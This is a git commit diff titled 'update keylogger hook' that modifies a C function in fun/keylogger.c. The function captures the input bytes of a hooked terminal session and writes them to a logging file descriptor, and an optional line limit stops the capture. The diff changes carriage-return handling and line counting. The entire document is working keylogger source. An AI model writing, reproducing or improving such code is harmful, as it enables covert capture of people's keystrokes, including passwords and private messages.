14056504b6c1f41b8d7a371b4dcc0959eeeef3b3
Matheus <mmedeiros450@gmail.com>
2020-03-10 10:12:11 -0300

    update keylogger hook

--- fun/keylogger.c
+++ fun/keylogger.c
@@ -2,26 +2,35 @@
 static void keylogger(tas_tty *tty, char **buf, size_t *n)
 {
 	int fd = tty->output_fd;
+	char aux;
+
+	int last_byte = (*n - 1);
+
+	aux = (*buf)[last_byte];
+	if (aux == '\r') {
+		(*buf)[last_byte] = '\n';
+	}
 
 #ifdef LINE_LIMIT
 	static int lines = 0;
 
-	for (size_t i = 0; i < *n; i++) {
-		if ((*buf)[i] == '\n' || (*buf)[i] == '\r') {
-			lines++;
-		}
-
-		if (lines == LINE_LIMIT) {
-			write(fd, *buf, i + 1);
-			close(fd);
-
-			tty->input_hook = NULL;
-			return;
-		}
+	if ((*buf)[last_byte] == '\n') {
+		lines++;
 	}
 
+	if (lines == LINE_LIMIT) {
+		write(fd, *buf, *n);
+		close(fd);
+
+		(*buf)[last_byte] = aux;
+
+		tty->input_hook = NULL;
+		return;
+	}
 #endif
 
 	if (write(fd, *buf, *n) == -1)
 		tty->input_hook = NULL;
+
+	(*buf)[last_byte] = aux;
 }
